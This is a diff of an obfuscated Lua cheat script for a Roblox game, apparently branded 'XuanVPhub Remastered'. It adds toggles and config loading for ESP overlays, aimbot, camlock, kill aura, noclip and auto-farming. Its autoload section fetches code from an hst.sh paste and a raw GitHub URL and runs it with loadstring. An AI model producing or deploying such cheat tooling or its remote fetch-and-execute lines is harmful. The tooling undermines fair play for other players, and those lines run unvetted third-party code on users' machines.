+    local v310, v311, v312 = string.gmatch(vu201.HighlightColorInput_ESPDisplay.Value, "%d+")
+    local v313 = {}
+    while true do
+        v312 = v310(v311, v312)
+        if v312 == nil then
+            break
+        end
+        table.insert(v313, tonumber(v312))
+    end
+    if # v313 == 3 then
+        _G.ColorLight = Color3.fromRGB(v313[1], v313[2], v313[3])
+    end
+end)
+vu47:AddToggle("EnableEspGuiToggle_ESPDisplay", {
+    Title = "Enable ESP GUI (Text)",
+    Default = false
+}):OnChanged(function()
+    _G.EspGui = vu201.EnableEspGuiToggle_ESPDisplay.Value
+end)
+local vu314 = vu47:AddInput("GuiTextColorInput_ESPDisplay", {
+    Title = "GUI Text Color (R,G,B)",
+    PlaceholderText = "255,255,255",
+    Default = "255,255,255"
+})
+local v315 = vu314
+vu314.OnChanged(v315, function()
+    local v316, v317, v318 = string.gmatch(vu201.GuiTextColorInput_ESPDisplay.Value, "%d+")
+    local v319 = {}
+    while true do
+        v318 = v316(v317, v318)
+        if v318 == nil then
+            break
+        end
+        table.insert(v319, tonumber(v318))
+    end
+    if # v319 == 3 then
+        _G.EspGuiTextColor = Color3.fromRGB(v319[1], v319[2], v319[3])
+    end
+end)
+vu47:AddSlider("EspGuiTextSizeSlider_ESPDisplay", {
+    Title = "ESP Text Size",
+    Min = 8,
+    Max = 30,
+    Default = 15,
+    Rounding = 0
+}):OnChanged(function()
+    _G.EspGuiTextSize = vu201.EspGuiTextSizeSlider_ESPDisplay.Value
+end)
+vu47:AddParagraph({
+    Title = "\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128",
+    Content = ""
+})
+vu47:AddToggle("ShowEspNameToggle_ESPDisplay", {
+    Title = "Show Name",
+    Default = false
+}):OnChanged(function()
+    _G.EspName = vu201.ShowEspNameToggle_ESPDisplay.Value
+end)
+vu47:AddToggle("ShowEspDistanceToggle_ESPDisplay", {
+    Title = "Show Distance",
+    Default = false
+}):OnChanged(function()
+    _G.EspDistance = vu201.ShowEspDistanceToggle_ESPDisplay.Value
+end)
+vu47:AddToggle("ShowEspHealthToggle_ESPDisplay", {
+    Title = "Show Health",
+    Default = false
+}):OnChanged(function()
+    _G.EspHealth = vu201.ShowEspHealthToggle_ESPDisplay.Value
+end)
+vu47:AddToggle("ShowEspTimeToggle_ESPDisplay", {
+    Title = "Show Train Time",
+    Default = false
+}):OnChanged(function()
+    _G.EspTimeEnabled = vu201.ShowEspTimeToggle_ESPDisplay.Value
+end)
+vu47:AddToggle("ShowEspTrainDistToggle_ESPDisplay", {
+    Title = "Show Train Travelled Distance",
+    Default = false
+}):OnChanged(function()
+    _G.EspDistanceTrain = vu201.ShowEspTrainDistToggle_ESPDisplay.Value
+end)
+vu27:SetLibrary(v26)
+v28:SetLibrary(v26)
+vu27:IgnoreThemeSettings()
+vu27:SetIgnoreIndexes({})
+v28:SetFolder("XuanVPhubFluent")
+vu27:SetFolder("XuanVPhubFluent/UserData")
+v28:BuildInterfaceSection(v39.Settings)
+vu27:BuildConfigSection(v39.Settings)
+pcall(function()
+    vu27:LoadAutoloadConfig()
+    local function v324(p320, p321, p322)
+        local v323 = p322:GetOption(p320)
+        if vu201[p320] and vu201[p320].Value ~= nil then
+            _G[p321] = vu201[p320].Value
+            if v323 then
+                v323:SetValue(_G[p321])
+            else
+                warn("Kh\195\180ng t\195\172m th\225\186\165y option instance cho: ", p320)
+            end
+        elseif _G[p321] ~= nil and v323 then
+            v323:SetValue(_G[p321])
+        end
+    end
+    v324("NoClip", "NoClipEnabled", vu41)
+    if vu201.ThirdPerson and vu201.ThirdPerson.Value ~= nil then
+        if vu52 then
+            vu52:SetValue(vu201.ThirdPerson.Value)
+        end
+        if vu201.ThirdPerson.Value then
+            vu199.CameraMode = Enum.CameraMode.Classic
+            vu199.CameraMaxZoomDistance = 90
+        else
+            vu199.CameraMode = Enum.CameraMode.LockFirstPerson
+            vu199.CameraMaxZoomDistance = 0
+        end
+    end
+    if vu201.FullBright and vu201.FullBright.Value ~= nil then
+        if vu54 then
+            vu54:SetValue(vu201.FullBright.Value)
+        end
+        if vu201.FullBright.Value then
+            vu37.Ambient = Color3.new(1, 1, 1)
+            vu37.OutdoorAmbient = Color3.new(1, 1, 1)
+            vu37.Brightness = 5
+            vu37.GlobalShadows = false
+        else
+            vu37.Ambient = Color3.new(0.5, 0.5, 0.5)
+            vu37.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
+            vu37.Brightness = 2
+            vu37.GlobalShadows = true
+        end
+    end
+    v324("AutoLoot", "AutoLootEnabled", vu41)
+    v324("AutoBondEnabled", "Loop", vu44)
+    if getgenv().Loop then
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://hst.sh/raw/ufowonutah"))()
+            end)
+        end)
+    end
+    v324("AutoBondV2Enabled", "AutoBondV2Enabled", vu44)
+    if vu201.AutoBondV2Enabled and vu201.AutoBondV2Enabled.Value then
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/XUANVNPRO/Bondfarm/refs/heads/main/Bondv2"))()
+            end)
+        end)
+    end
+    v324("EspTrainToggle_ESP", "EspTrain", vu46)
+    v324("EspOreToggle_ESP", "EspOrb", vu46)
+    v324("EspPlayerToggle_ESP", "EspPlayer", vu46)
+    v324("ItemEspChooseDropdown_ESP", "ItemEspChoose", vu46)
+    v324("EspItemToggle_ESP", "EspItem", vu46)
+    v324("EspModsToggle_ESP", "EspMods", vu46)
+    v324("EspBankToggle_ESP", "EspBank", vu46)
+    v324("EnableEspHighlightToggle_ESPDisplay", "EspHighlight", vu47)
+    if vu201.HighlightColorInput_ESPDisplay and vu201.HighlightColorInput_ESPDisplay.Value ~= nil then
+        local v325, v326, v327 = string.gmatch(vu201.HighlightColorInput_ESPDisplay.Value, "%d+")
+        local v328 = {}
+        while true do
+            v327 = v325(v326, v327)
+            if v327 == nil then
+                break
+            end
+            table.insert(v328, tonumber(v327))
+        end
+        if # v328 == 3 then
+            _G.ColorLight = Color3.fromRGB(v328[1], v328[2], v328[3])
+        end
+        if vu308 then
+            vu308:SetValue(vu201.HighlightColorInput_ESPDisplay.Value)
+        end
+    end
+    v324("EnableEspGuiToggle_ESPDisplay", "EspGui", vu47)
+    if vu201.GuiTextColorInput_ESPDisplay and vu201.GuiTextColorInput_ESPDisplay.Value ~= nil then
+        local v329, v330, v331 = string.gmatch(vu201.GuiTextColorInput_ESPDisplay.Value, "%d+")
+        local v332 = {}
+        while true do
+            v331 = v329(v330, v331)
+            if v331 == nil then
+                break
+            end
+            table.insert(v332, tonumber(v331))
+        end
+        if # v332 == 3 then
+            _G.EspGuiTextColor = Color3.fromRGB(v332[1], v332[2], v332[3])
+        end
+        if vu314 then
+            vu314:SetValue(vu201.GuiTextColorInput_ESPDisplay.Value)
+        end
+    end
+    v324("EspGuiTextSizeSlider_ESPDisplay", "EspGuiTextSize", vu47)
+    v324("ShowEspNameToggle_ESPDisplay", "EspName", vu47)
+    v324("ShowEspDistanceToggle_ESPDisplay", "EspDistance", vu47)
+    v324("ShowEspHealthToggle_ESPDisplay", "EspHealth", vu47)
+    v324("ShowEspTimeToggle_ESPDisplay", "EspTimeEnabled", vu47)
+    v324("ShowEspTrainDistToggle_ESPDisplay", "EspDistanceTrain", vu47)
+    v324("ShowHealthBarModsToggle", "HealthBarMods", vu42)
+    v324("CharacterModsDropdown", "CharacterMods", vu42)
+    v324("NoModsCombatFilterDropdown", "NoModsCombatFilter", vu42)
+    v324("MeleeAttackTypeDropdown", "FastMelee", vu42)
+    v324("AutoAttackMeleeToggle", "AutoAttackMelee", vu42)
+    v324("GunAuraTypeDropdown", "GunAuraKillSkib", vu42)
+    v324("GunAuraDelayShotSlider", "DelayShot", vu42)
+    v324("GunAuraReachShotSlider", "ReachShot", vu42)
+    v324("GunAuraKillToggle", "KillAuraGun", vu42)
+    v324("AutoReloadGunToggle", "AutoReload", vu42)
+    v324("AimbotModsToggle", "AimbotMods", vu42)
+    v324("CamlockModsToggle", "CamlockMods", vu42)
+    v324("AutoHealHealthThresholdSlider", "HealthyHeal", vu42)
+    v324("AutoHealToggle", "AutoHeal", vu42)
+end)
+v29:SelectTab(1)
+v26:Notify({
+    Title = "XuanVPhub Remastered",
+    Content = "Script \196\145\195\163 \196\145\198\176\225\187\163c t\225\186\163i v\195\160 s\225\186\181n s\195\160ng! (v2 - S\225\187\173a l\225\187\151i Keybind)",
+    Duration = 7
+})
+print("XuanVPhub Remastered: Script \196\145\195\163 \196\145\198\176\225\187\163c t\225\186\163i v\195\160 s\225\186\181n s\195\160ng! (v2 - S\225\187\173a l\225\187\151i Keybind)")
